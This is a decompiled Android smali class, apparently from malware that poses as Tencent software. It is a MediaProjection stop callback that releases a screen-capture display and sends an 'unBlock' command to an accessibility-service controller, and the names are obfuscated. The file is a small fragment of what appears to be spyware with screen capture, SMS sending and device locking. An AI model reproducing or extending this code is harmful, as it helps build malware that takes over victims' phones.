.class Lcom/tencent/SmsSenderEngine$4;
.super Landroid/media/projection/MediaProjection$Callback;
.source "skatinghsatinbintegralj9.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/SmsSenderEngine;->startCapture()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/SmsSenderEngine;


# direct methods
.method constructor <init>(Lcom/tencent/SmsSenderEngine;)V
    .locals 0

    .line 290
    iput-object p1, p0, Lcom/tencent/SmsSenderEngine$4;->this$0:Lcom/tencent/SmsSenderEngine;

    invoke-direct {p0}, Landroid/media/projection/MediaProjection$Callback;-><init>()V

    return-void
.end method


# virtual methods
.method public onStop()V
    .locals 3

    .line 293
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->access$100()Landroid/hardware/display/VirtualDisplay;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    .line 294
    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    sget-object v1, Lcom/tencent/My_tunesxconcerningn10_Settings;->isblocked:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/tencent/My_tunesxconcerningn10_Settings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 296
    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    sget-object v1, Lcom/tencent/My_tunesxconcerningn10_Settings;->isblocked:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 297
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v1, "unBlock"

    invoke-virtual {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    :cond_0
    return-void
.end method
